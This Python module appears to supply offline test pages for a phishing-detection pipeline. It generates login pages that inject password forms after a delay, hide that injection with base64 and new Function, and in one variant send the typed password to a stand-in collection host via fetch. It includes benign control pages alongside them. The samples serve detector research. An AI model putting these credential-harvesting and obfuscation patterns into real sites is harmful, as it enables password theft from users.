"""Trusted, fully offline examples using the same integrated analysis pipeline."""
import base64
import json

ROOT="https://research-demo.example"
FORM="<form method='post' action='https://login-service.example/collect'><label>Email<input name='email' type='email'></label><label>Password<input name='password' type='password'></label><button type='submit'>Sign in</button></form>"


def document(body,script=""):
    return "<!doctype html><html><head><meta charset='utf-8'><title>Research demo</title></head><body>"+body+("<script>"+script+"</script>" if script else "")+"</body></html>"


def examples():
    delayed="setTimeout(()=>document.getElementById('mount').innerHTML="+json.dumps(FORM)+",650)"
    variants={
        "delayed_login":document("<main id='mount'>Please wait</main>",delayed),
        "encoded_login":document("<main id='mount'>Please wait</main>","new Function(atob("+json.dumps(base64.b64encode(delayed.encode()).decode())+"))()"),
        "external_login":document("<main id='mount'>Please wait</main><script src='/app.js'></script>"),
        "ordinary_sso":document("<h1>Ordinary sign in control</h1>"+FORM),
        "contact_form":document("<h1>Contact us</h1><form><label>Email<input type='email'></label><label>Message<textarea></textarea></label><button>Send</button></form>"),
        "redirect_login":document("<p>Loading another page</p>","setTimeout(()=>location.replace('/destination'),650)"),
        "fetch_login":document(FORM,"document.querySelector('form').onsubmit=e=>{e.preventDefault();fetch('https://login-service.example/collect',{method:'POST',body:document.querySelector('input[type=password]').value}).catch(()=>{})}"),
        "private_resource":document("<script src='http://127.0.0.1/internal.js'></script><p>Blocked resource control</p>"),
        "missing_script":document("<script src='/missing.js'></script><p>Incomplete resource control</p>"),
    }
    rows={}
    for name,html in variants.items():
        url=ROOT+"/"+name
        resources={url:{"headers":{"content-type":"text/html; charset=utf-8"},"body":html}}
        if name=="external_login":
            resources[ROOT+"/app.js"]={"headers":{"content-type":"text/javascript"},"body":delayed}
        if name=="redirect_login":
            resources[ROOT+"/destination"]={"headers":{"content-type":"text/html; charset=utf-8"},"body":document(FORM)}
        rows[name]={"url":url,"resources":resources}
    return rows


def analyze_demo(detector,name="delayed_login",observe_ms=1600,action_ms=650):
    from .behavior import analyze_browser_capture
    rows=examples()
    if name not in rows:
        raise ValueError("Unknown research demo.")
    row=rows[name]
    result=analyze_browser_capture(detector,row["url"],row["resources"],observe_ms,action_ms)
    result["demonstration"]={"case":name,"all_resources_offline":True,"is_accuracy_test":False}
    return result
